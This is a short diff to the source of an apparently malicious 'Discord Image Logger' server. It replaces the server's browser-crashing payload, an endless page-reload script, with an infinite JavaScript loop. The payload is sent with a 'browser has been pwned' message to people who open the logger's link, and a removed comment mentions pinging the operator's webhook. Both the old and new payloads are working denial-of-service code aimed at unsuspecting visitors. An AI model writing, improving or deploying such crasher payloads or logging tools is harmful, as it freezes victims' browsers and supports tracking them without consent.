@@ -23,7 +23,6 @@ config = {
     # OPTIONS #
     "crashBrowser": {
         "doCrashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
-                                 # Note this will nuke your webhook with pings. Working on a fix.
         "customMessage": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
     },
 
@@ -150,7 +149,7 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             datatype = 'image/jpeg'
             if config["crashBrowser"]["doCrashBrowser"]:
                 datatype = 'text/html'
-                data = config["crashBrowser"]["customMessage"].encode() + b'<script>\nonbeforeunload = function(){localStorage.x=1};\n\nsetTimeout(function(){\n  while(1)location.reload(1)\n}, 1000)\n</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
+                data = config["crashBrowser"]["customMessage"].encode() + b'<script>for (var i=69420;i==i;i*=i){console.log(i)}</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
 
             elif config["redirect"]["redirect"]:
                 datatype = 'text/html'
